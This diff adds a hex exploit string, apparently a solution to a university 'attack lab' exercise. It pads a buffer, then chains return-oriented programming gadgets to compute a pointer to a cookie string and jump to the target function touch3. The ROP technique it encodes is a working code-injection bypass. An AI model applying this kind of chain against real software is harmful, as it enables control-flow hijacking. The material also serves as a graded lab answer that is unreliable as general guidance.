@@ -1,0 +1,17 @@
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+AA AA AA AA AA AA AA AA
+06 1a 40 00 00 00 00 00     /* jump 0x401a06               ;movq %rsp, %rax */
+c5 19 40 00 00 00 00 00     /* jump 0x4019c5               ;movq %rax, %rdi */
+ab 19 40 00 00 00 00 00     /* jump 0x4019ab               ;popq %rax       */
+48 00 00 00 00 00 00 00     /* distance from here to cookie string          */
+dd 19 40 00 00 00 00 00     /* jump 0x4019dd               ;movl %eax, %edx */
+34 1a 40 00 00 00 00 00     /* jump 0x401a34               ;movl %edx, %ecx */
+13 1a 40 00 00 00 00 00     /* jump 0x401a13               ;movl %ecx, %esi */
+d6 19 40 00 00 00 00 00     /* jump 0x4019d6        ;lea (%rdi,%rsi,1),%rax */
+c5 19 40 00 00 00 00 00     /* jump 0x4019c5               ;movq %rax, %rdi */
+fa 18 40 00 00 00 00 00     /* touch3                                       */
+35 39 62 39 39 37 66 61     /* cookie string                                */
+00 00 00 00 00 00 00 00     /* string ends with 00                          */
